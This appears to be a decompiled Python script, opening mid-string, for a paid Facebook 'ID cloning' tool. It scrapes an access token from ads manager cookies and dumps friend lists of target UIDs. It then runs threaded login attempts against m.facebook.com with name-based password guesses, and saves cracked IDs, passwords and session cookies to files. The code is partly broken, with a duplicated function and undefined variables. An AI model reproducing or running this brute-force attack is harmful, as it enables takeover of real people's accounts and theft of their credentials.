𝗣𝗔𝗜𝗗(𝐔𝐬𝐞𝐫 𝐎𝐧𝐥𝐲)\n[\x7f] FACEBOOK     :      SAED HASAN\n[\x7f] VERSION      :      7.3\n[\x7f] MESSENGER    :     Chor Kishoreganj Black het Hacker👨‍💻AK-SAED HASAN\n=================================================="\x1b[1;23m'
balpakna = '\x1b[38;5;50m══════════════════════════════════════════════════'
meyermarexudi = ' \x1b[0;97m============================================='
alltimexudi = ' \x1b[32;1m[-] ONLY APPROVAL SYSTEM 15 DEYS 6 Dollars  30 10 Dollars FOR    APPROVAL'
xudartimenai = ' \x1b[32;1m[+] CONTACT ADMIN PLZ ENTAR'
fuckyoursali = ' \x1b[32;1m[𝟷] 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙸𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝙿𝙿𝚁𝙾𝚅𝙴𝙳'
xudinaministar = ' \x1b[38;1m[-] Importent Note '
hedaborakarent = ' \x1b[35;1m[𝟸] 𝙵𝚄𝙲𝙺 𝙱𝚈𝙿𝙰𝚂𝙰𝚁 𝙲𝙷𝙰𝙺𝙴 𝚈𝙾𝚄𝚁 𝙳𝙰𝚃𝙰 ABAL😎 '

def meyexudi():
    os.system('clear')
    print(logo)
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = '-'.join(uuid)
    try:
        httpCaht = requests.get('https://github.com/saedhasan7840/AK-FILE/blob/main/approval.txt').text
        if id in httpCaht:
            print(fuckyoursali)
            print(hedaborakarent)
         #   msg = str(os.geteuid())
            # CON.print(msg)
            print()
            return
        else:
            print(meyermarexudi)
            # print(" \x1b[32;1m[+] YOUR KEY : "+id)
            print(' \x1b[38;5;208m╔══[𝟷]💥  FREE-FIRE-TIK-TOK- ID CLONING')
            print(' \x1b[1;98m║══[𝟸]💥  ONLY ACTIVE ID CLONE 100%')
            print(' \x1b[1;93m║══[𝟸]💥  CP ID WILL BE LOGIN 80%')
            print(' \x1b[1;97m║══[𝟸]💥  WI-FI  AND DATA BOTH WORKING 100%')
            print(' \x1b[1;95m║══[𝟸]💥  15 DAY 6 Dollar')
            print(' \x1b[38;5;50m║══[𝟸]💥  30 DAY 10 Dollar')
            os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   AK,   SAED,    Please,   Send,   Your,   Key,"')
            print(' \x1b[0m║══[𝟸] YOUR KEY : ' + id)
            input(' \x1b[1;30m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
            tks = 'Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20' + id
            os.system('am start https://wa.me/+966537468224?text=' + tks)
            time.sleep(1)
            meyexudi()
    except Exception:
        # print("  Bypasser Are Not Allow Bro So Bye Bye ")
        sys.exit()

#meyexudi()

def naima():
    print('-------------------')

print(logo)
os.system('espeak -a 300 " Please,   Text,   Your,   Real,   Name,   Sir,"')
uname = input('\x1b[1;91m[\x1b[1;91m•\x1b[1;91m]\x1b[1;33m WHAT IS YOUR NAME \x1b[1;91m: \x1b[1;31m')
os.system('espeak -a 300 " Welcome,   to,  AK.SAED,  PAID,   Tools"')

os.system('clear')

def login():
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], cookies={'cookie': cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2, sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('\x1b[0;97m=================')
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()

def login_lagi334():
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], cookies={'cookie': cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2, sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('\x1b[0;97m=================')
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()

def login_lagi334():
    try:
        os.system('clear')
        print(logo)
        ses = requests.Session()
        cookies = {
            'cookie': cookie
        }
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url, cookies=cookies)
        set = re.search('act=(.*?)&nav_source', str(req.content)).group(1)
        nek = str(url) + '?act=' + str(set) + '&nav_source=no_referrer'
        roq = ses.get(nek, cookies=cookies)
        tok = re.search('accessToken="(.*?)"', str(roq.content)).group(1)
        tokenw = open('.token.txt', 'w').write(tok)
        cokiew = open('.cok.txt', 'w').write(cookie)
    except Exception as e:
        os.system('rm -f .token.txt')
        os.system('rm -f .cok.txt')
        os.system('python AK-FILE.py')
        exit()

class jalan:

    def __init__(self, z):
        for e in z + '\n':
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.04)

def menu():
    os.system('clear')
    print(logo)
    print('\x1b[95;1m[\x1b[95;1m+\x1b[95;1m] \x1b[1;95m𝐔𝐒𝐄𝐑 𝐍𝐀𝐌𝐄\x1b[1;91m :\x1b[1;96m ' + uname)
    print("\x1b[97;1m[\x1b[92;1m•\x1b[97;1m] \x1b[0;93mTODAY'S DATE :\x1b[1;96m " + date)
    print('\x1b[0;97m===============================================')
    print('\x1b[91;1m[\x1b[92;1m1\x1b[91;1m] \x1b[0;91m𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚         ')
    print('\x1b[95;1m[\x1b[95;1m2\x1b[95;1m] \x1b[0;95m𝗖𝗢𝗡𝗧𝗔𝗖𝗧 ᏔᏆͲᎻ 𝗔𝗗𝗠𝗜𝗡')
    print('\x1b[93;1m[\x1b[93;1m3\x1b[93;1m] \x1b[93;1m𝗖𝗛𝗘𝗖𝗞 ϴᏦ 𝗜𝗗𝘇   ')
    print('\x1b[98;1m[\x1b[98;1m0\x1b[98;1m] \x1b[0;98mᎬХᏆͲ')
    print('\x1b[0;97m=================')
    HEART = input('\x1b\x1b[1;91m[\x1b[1;92m√\x1b[1;91m] \x1b[1;96mCHOOSE: ')
    if HEART in ['111']:
        login()
        dump_massal()
        return
    if HEART in ['1']:
        crack_file()
        return
    if HEART in ['2', '02']:
        os.system('xdg-open https://t.me/aksaedhasan')
        os.system('python AK-FILE.py')
        return
    if HEART in ['3', '03']:
        result()
        return
    if HEART in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\x1b[0;97m=================')
        animation(' [×] DONE EXIT ')
        exit()
        return
    else:
        print('\x1b[0;97m=================')
        animation(' [×] SELECT CORRECTLY ')
        back()

def result():
    os.system('clear')
    print(logo)
    print(' \x1b[96;1m[\x1b[96;1m1\x1b[96;1m] CHECK CP IDZ ')
    print(' \x1b[95;1m[\x1b[95;1m2\x1b[95;1m] CHECK OK IDZ ')
    print(' \x1b[94;1m[\x1b[94;1m3\x1b[94;1m] EXIT ')
    print('\x1b[0;91m==================')
    kz = input(' \x1b[95;1m[\x1b[95;1m•\x1b[95;1m]CHOOSE : ')
    if kz in ['1', '01']:
        try:
            vin = os.listdir('CP')
        except FileNotFoundError:
            print('\x1b[0;91m==================')
            animation(' \x1b[96;1m[\x1b[92;1m•\x1b[976;1m] FILE NOT FOUND ')
            time.sleep(3)
            back()
        if len(vin) == 0:
            print('\x1b[0;91m==================')
            animation(' \x1b[95;1m[\x1b[95;1m•\x1b[95;1m] NO CP RESULTS FOUND ')
            time.sleep(2)
            back()
            return
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:
                    hem = open('CP/' + isi, 'r').readlines()
                except:
                    continue
                cih += 1
                if cih < 10:
                    nom = '' + str(cih)
                    lol.update({str(cih): str(isi)})
                    lol.update({nom: str(isi)})
                    print('\x1b[0;91m==================')
                    print(' ' + nom + '. ' + isi + '\x1b[31m ' + str(len(hem)) + ' \x1b[0m CP ' + x)
                else:
                    lol.update({str(cih): str(isi)})
                    print(' ' + str(cih) + '. ' + isi + '\x1b[31m ' + str(len(hem)) + ' \x1b[0m CP ' + x)
            print('\x1b[0;91m==================')
            geeh = input(' \x1b[95;1m[\x1b[95;1m•\x1b[95;1m] CHOOSE : ')
            print('\x1b[0;91m==================')
            try:
                geh = lol[geeh]
                try:
                    lin = open('CP/' + geh, 'r').read().splitlines()
                except:
                    print('\x1b[0;91m==================')
                    animation(' \x1b[95;1m[\x1b[92;1m•\x1b[95;1m] FILE NOT FOUND ')
                    time.sleep(2)
                    back()
                nocp = 0
                for cpku in range(len(lin)):
                    cpkuni = lin[nocp].split('|')
                    print(' \x1b[95;1m[\x1b[92;1m•\x1b[95;1m] CP : \x1b[35m ' + cpkuni[0] + '|' + cpkuni[1] + '\x1b[0m')
                    nocp += 1
                print('\x1b[0;95m==================')
                input('\x1b[97;1m[\x1b[92;1m•\x1b[97;1m] PRESS ENTER TO BACK ')
                back()
            except KeyError:
                print('\x1b[0;91m==================')
                animation(' \x1b[95;1m[\x1b[92;1m•\x1b[95;1m] NO OPTION FOUND ')
                exit()
    elif kz in ['2', '02']:
        try:
            vin = os.listdir('OK')
        except FileNotFoundError:
            print('\x1b[0;91m==================')
            animation(' \x1b[95;1m[\x1b[92;1m•\x1b[95;1m] FILE NOT FOUND ')
            time.sleep(2)
            back()
        if len(vin) == 0:
            print('\x1b[0;91m==================')
            animation(' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] NO OK RESULTS FOUND ')
            time.sleep(2)
            back()
            return
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:
                    hem = open('OK/' + isi, 'r').readlines()
                except:
                    continue
                cih += 1
                if cih < 100:
                    print('\x1b[0;95m==================')
                    nom = '' + str(cih)
                    lol.update({str(cih): str(isi)})
                    lol.update({nom: str(isi)})
                    print(' ' + nom + '. ' + isi + '\x1b[35m ' + str(len(hem)) + ' \x1b[0m OK ' + x)
                else:
                    lol.update({str(cih): str(isi)})
                    print(' ' + str(cih) + '. ' + isi + '\x1b[32m ' + str(len(hem)) + ' \x1b[0m OK ' + x)
            print('\x1b[0;93m==================')
            geeh = input(' \x1b[1;92m [•] CHOOSE : ')
            print('\x1b[0;93m==================')
            try:
                geh = lol[geeh]
                try:
                    lin = open('OK/' + geh, 'r').read().splitlines()
                except:
                    print('\x1b[0;91m==================')
                    animation(' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] FILE NOT FOUND ')
                    time.sleep(2)
                    back()
                nocp = 0
                for cpku in range(len(lin)):
                    cpkuni = lin[nocp].split('|')
                    print('\x1b[95;1m[\x1b[92;1m•\x1b[95;1m] OK : \x1b[35m ' + cpkuni[0] + '|' + cpkuni[1] + '\x1b[0m')
                    nocp += 1
                print('\x1b[0;91m==================')
                input('\x1b[95;1m[\x1b[92;1m•\x1b[95;1m] PRESS ENTER TO BACK ')
                back()
            except KeyError:
                print('\x1b[0;93m==================')
                animation(' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] NO OPTION FOUND ')
                exit()
    elif kz in ['0', '00']:
        back()
        return
    else:
        print('\x1b[0;91m==================')
        animation(' \x1b[95;1m[\x1b[92;1m•\x1b[95;1m] NO OPTION FOUND IN MENU')
        exit()

def dump_massal():
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except IOError:
        exit()
    try:
        print('\x1b[0;91m==================')
        jum = int(input(' \x1b[95;1m[\x1b[92;1m•\x1b[95;1m] ENTER TARGET AMOUNT  : '))
        print('\x1b[0;91m==================')
    except ValueError:
        print('\x1b[0;91m==================')
        animation(' [×] INVALID OPTION ')
        exit()
    if jum < 1 or jum > 100000000:
        print('\x1b[0;91m==================')
        animation(' [×] TRY AGAIN ')
        exit()
    ses = requests.Session()
    yz = 0
    for met in range(jum):
        yz += 1
        kl = input(' \x1b[97;1m[\x1b[92;1m•\x1b[95;1m] INPUT UID ' + str(yz) + ' : ')
        uid.append(kl)
    for userr in uid:
        try:
            col = ses.get('https://graph.facebook.com/v2.0/' + userr + '?fields=friends.limit(5000)&access_token=' + tokenku[0], cookies={'cookie': cok}).json()
            for mi in col['friends']['data']:
                try:
                    iso = mi['id'] + '|' + mi['name']
                    if iso in id:
                        pass
                    else:
                        id.append(iso)
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            print('\x1b[0;95m==================')
            animation(' [×] TRY AGAIN ')
            os.system('clear')
    try:
        print('\x1b[0;91m==================')
        print(' \x1b[92;1m[\x1b[92;1m•\x1b[92;1m] TOTAL ID : \x1b[36m' + str(len(id)) + '\x1b[1;37m')
        setting()
    except requests.exceptions.ConnectionError:
        print(u)
        back()
    except (KeyError, IOError):
        print('\x1b[0;91m==================')
        animation(' [×] DUMP ID FAILED ')
        time.sleep(3)
        back()

def crack_file():
    print('\x1b[0;93m==================')
    os.system('espeak -a 300 " your file name"')
    print('\x1b[1;36m[ Put File Example:  /sdcard/king.txt  Etc...]')
    o = input('\x1b[95;1m[\x1b[92;1m+\x1b[95;1m] INPut FILE NAME :\x1b[95;1m ')
    try:
        lin = open(o).read().splitlines()
    except:
        print('\x1b[0;98m==================')
        animation(' [×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()

def setting():
    print('\x1b[0;91m=============================')
    print('\x1b[95;1m[\x1b[95;1m1\x1b[95;1m] \x1b[0;95mCLONING FOR ONLY 𝐎??𝐃 IDz')
    print('\x1b[98;1m[\x1b[98;1m2\x1b[98;1m] \x1b[0;98mCLONING FOR ONLY 𝐍𝐄𝐖 IDz')
    print('\x1b[91;1m[\x1b[91;1m3\x1b[91;1m] \x1b[0;91mCLONING FOR 𝐌𝐈𝐗 IDz')
    print('\x1b[0;91m=============================')
    hu = input('\x1b[95;1m[\x1b[92;1m+\x1b[95;1m]CHOOSE :\x1b[95;1m ')
    if hu in ['1', '01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2', '02']:
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ['3', '03']:
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    print('\x1b[0;91m==================')
    print('\x1b[0;91m==================')
    print('\x1b[98;1m[\x1b[98;1m1\x1b[98;1m] METHOD 1 [\x1d𝐍𝐞𝐰 𝐕𝐞𝐫𝐬𝐢𝐨𝐧\x1b[1;37m]')
    print('\x1b[93;1m[\x1b[93;1m2\x1b[93;1m] METHOD 2 [\x1c𝐎𝐥𝐝 𝐕𝐞𝐫𝐬𝐢𝐨𝐧\x1b[1;37m]')
    print('\x1b[0;91m==================')
    hc = input('\x1b[95;1m[\x1b[92;1m•\x1b[95;1m] CHOOSE : ')
    if hc in ['1', '01']:
        method.append('mobile')
    elif hc in ['2', '02']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit()

def passwrd():
    os.system('clear')
    print(logo)
    print('\x1b[1;91m[\x1b[1;91m√\x1b[1;91m] \x1b[1;91m𝐘𝐎𝐔𝐑 𝐓𝐎𝐎𝐋𝐒 𝙰𝙲𝚃𝙸𝚅𝙴 \x1b[38;5;50m[𝙿𝚁𝙴𝙼𝙸𝚄𝙼] ')
    print('\x1b[1;91m[\x1b[1;91m√\x1b[1;91m] \x1b[1;91m𝐔𝐒𝐄𝐑𝐒 𝐍𝐀𝐌𝐄\x1b[1;91m :\x1b[1;96m ' + uname)
    print("\x1b[1;91m[\x1b[1;92m√\x1b[1;91m] \x1b[1;95m𝗧𝗢𝗗𝗔𝗬'𝗦 𝙳𝙰𝚃𝙴 :\x1b[38;5;50m " + date)
    print('\x1b[1;91m[\x1b[1;92m√\x1b[1;91m] \x1b[1;93m𝚈𝙾𝚄𝚁 TOTAL 𝙸𝙳𝚣 \x1b[0;97m:\x1b[38;5;50m ', str(len(id)))
    print('\x1b[1;91m[\x1b[1;92m√\x1b[1;91m] \x1b[1;95m𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗬𝗢𝗨𝗥 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗧𝗜𝗠𝗘 \x1b[0;97m :> \x1b[38;5;50m' + time.strftime('%H:%M') + ' ' + tag)
    print('\x1b[1;91m[\x1b[1;92m√\x1b[1;91m] \x1b[1;91m𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐒𝐏𝐄𝐄𝐃 𝐒𝐔𝐏𝐄𝐑 𝐅𝐀𝐒𝐓 ⏩')
    print('\x1b[1;91m[\x1b[1;92m√\x1b[1;91m] \x1b[1;98m𝐔𝐒𝐄=[𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄 𝙵𝙾𝚁 𝚂𝙿𝙴𝙴𝙳 𝚄𝙿💙] ')
    print('\x1b[38;5;50m===============================================')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf) < 6:
                if len(frs) < 3:
                    continue
                else:
                    pwv.append(frs + '12')
                    pwv.append(frs + '123')
                    pwv.append(frs + '1234')
                    pwv.append(frs + '12345')
                    pwv.append(frs + '123456')
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append(frs + '@123')
                    pwv.append(frs + '@')
                    pwv.append(frs + '@@')
                    pwv.append(frs + '@@@')
                    pwv.append(frs + '@@@@')
                    pwv.append(frs + '@#')
                    pwv.append(frs + '1122')
                    pwv.append(frs + '11')
                    pwv.append(frs + '111')
                    pwv.append(frs + '33')
                    pwv.append(frs + '333')
                    pwv.append(frs + '22')
                    pwv.append(frs + '222')
                    pwv.append(frs + 'gaming')
                    pwv.append(frs + 'khan')
                    pwv.append(frs + 'hosen')
                    pwv.append(frs + 'Gaming')
                    pwv.append(frs + 'khan')
                    pwv.append(frs + '019')
                    pwv.append(frs + '017')
                    pwv.append(frs + '016')
                    pwv.append(frs + '018')
                    pwv.append(frs + 'khan')
                    pwv.append(frs + 'hosen')
            elif len(frs) < 3:
                pwv.append(nmf)
            else:
                pwv.append(frs + '12')
                pwv.append(frs + '123')
                pwv.append(frs + '1234')
                pwv.append(frs + '12345')
                pwv.append(frs + '123456')
                pwv.append(nmf)
                pwv.append('57273200')
                pwv.append(frs + '@123')
                pwv.append(frs + '@')
                pwv.append(frs + '@@')
                pwv.append(frs + '@@@')
                pwv.append(frs + '@@@@')
                pwv.append(frs + '@#')
                pwv.append(frs + '1122')
                pwv.append(frs + '11')
                pwv.append(frs + '111')
                pwv.append(frs + '33')
                pwv.append(frs + '333')
                pwv.append(frs + '22')
                pwv.append(frs + '222')
                pwv.append(frs + 'gaming')
                pwv.append(frs + 'khan')
                pwv.append(frs + 'hosen')
                pwv.append(frs + 'hossain')
                pwv.append(frs + 'Gaming')
                pwv.append(frs + 'khan')
                pwv.append(frs + '019')
                pwv.append(frs + '017')
                pwv.append(frs + '016')
                pwv.append(frs + '018')
                pwv.append(frs + 'khan')
                pwv.append(frs + 'hosen')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:
                pass
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            elif 'free' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'touch' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree, idf, pwv)
            else:
                pool.submit(crackfree, idf, pwv)
    print('\n\x1b[1;37m===================================')
    print('\x1b[97;1m[\x1b[92;1m+\x1b[97;1m] CLONING COMPLETE TIME :\x1b[1;92m' + time.strftime('%H:%M') + ' ' + tag)
    print('\x1b[97;1m[\x1b[92;1m•\x1b[95;1m] OK :\x1b[0;92m %s ' % ok)
    print('\x1b[97;1m[\x1b[92;1m+\x1b[96;1m] CP :\x1b[0;93m %s ' % cp)
    print('\n\x1b[1;37m===================================')
    woi = input('\x1b[97;1m[\x1b[92;1m+\x1b[95;1m] \x1b[1;37m ENTER TO BACK')
    os.system('python AK-FILE.py')
    exit()

def crack(idf, pwv):
    bo = random.choice([m, k, h, b, u, x])
    sys.stdout.write(f'\r\x1b[100;95m{bo}[SAED 🔍•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{{:.0%}}{P}]'.format(loop / float(len(id))) + ']\x1b[0;37m ')
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip = random.choice(prox)
            proxs = {
                'http': 'socks4://' + nip
            }
            ses.headers.update({
                'Host': 'm.facebook.com',
                'upgrade-insecure-requests': '1',
                'user-agent': ua2,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'dnt': '1',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            })
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
                'uid': idf,
                'next': 'https://p.facebook.com/login/save-device/',
                'flow': 'login_no_pin',
                'pass': pw
            }
            koki = ';'.join(['%s=%s' % (key, value) for key, value in p.cookies.get_dict().items()])
            koki += ' m_pixel_ratio=2.625; wd=412x756'
            heade = {
                'Host': 'm.facebook.com',
                'viewport-width': '980',
                'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-prefers-color-scheme': 'light',
                'dnt': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'sec-fetch-site': 'none',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9'
            }
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False)
            if 'checkpoint' in po.cookies.get_dict().keys():
                print(f'\r\x1b[0;95m[SAED-Cp🌺]✅Uid┏━➤ {idf} 🔑Pass┏━➤{pw}')
                os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                open('CP/' + cpc, 'a').write(idf + ' • ' + pw + '\n')
                akun.append(idf + ' • ' + pw)
                cp += 1
                break
            elif 'c_user' in ses.cookies.get_dict().keys():
                ok += 1
                coki = po.cookies.get_dict()
                kuki = ';'.join(['%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
                print(f'\r\x1b[0;96m[SAED-Ok🌸] ✅Uid┏━➤ {idf} 🔑Pass┏━➤ {pw}\n\x1b[0;91m[🌼]= COOKIES • \x1b[0;91m{kuki} ')
                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                open('OK/' + okc, 'a').write(idf + ' • ' + pw + '\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1

def crackfree(idf, pwv):
    sys.stdout.write(f'\r{H}[SAED 🔍-M2]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{{:.0%}}{P}]  '.format(loop / float(len(id))))
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip = random.choice(prox)
            proxs = {
                'http': 'socks4://' + nip
            }
            ses.headers.update({
                'Host': 'm.facebook.com',
                'upgrade-insecure-requests': '1',
                'user-agent': ua2,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'dnt': '1',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            })
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
                'uid': idf,
                'next': 'https://p.facebook.com/login/save-device/',
                'flow': 'login_no_pin',
                'pass': pw
            }
            koki = ';'.join(['%s=%s' % (key, value) for key, value in p.cookies.get_dict().items()])
            koki += ' m_pixel_ratio=2.625; wd=412x756'
            heade = {
                'Host': 'm.facebook.com',
                'viewport-width': '980',
                'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-prefers-color-scheme': 'light',
                'dnt': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'sec-fetch-site': 'none',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9'
            }
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False)
            if 'checkpoint' in po.cookies.get_dict().keys():
                print(f'\r\x1b[0;95m[{time.strftime("%H:%M")}•SAED-Cp] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
                os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                open('CP/' + cpc, 'a').write(idf + ' • ' + pw + '\n')
                akun.append(idf + ' • ' + pw)
                cp += 1
                break
            elif 'c_user' in ses.cookies.get_dict().keys():
                ok += 1
                coki = po.cookies.get_dict()
                kuki = ';'.join(['%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
                print(f'\r\x1b[10;92m[{time.strftime("%H:%M")}•SAED-Ok] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                open('OK/' + okc, 'a').write(idf + ' • ' + pw + '\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1
if __name__ == '__main__':
    try:
        os.mkdir('OK')
    except:
        pass
    try:
        os.mkdir('CP')
    except:
        pass
    try:
        os.system('touch .prox.txt')
    except:
        pass
    menu()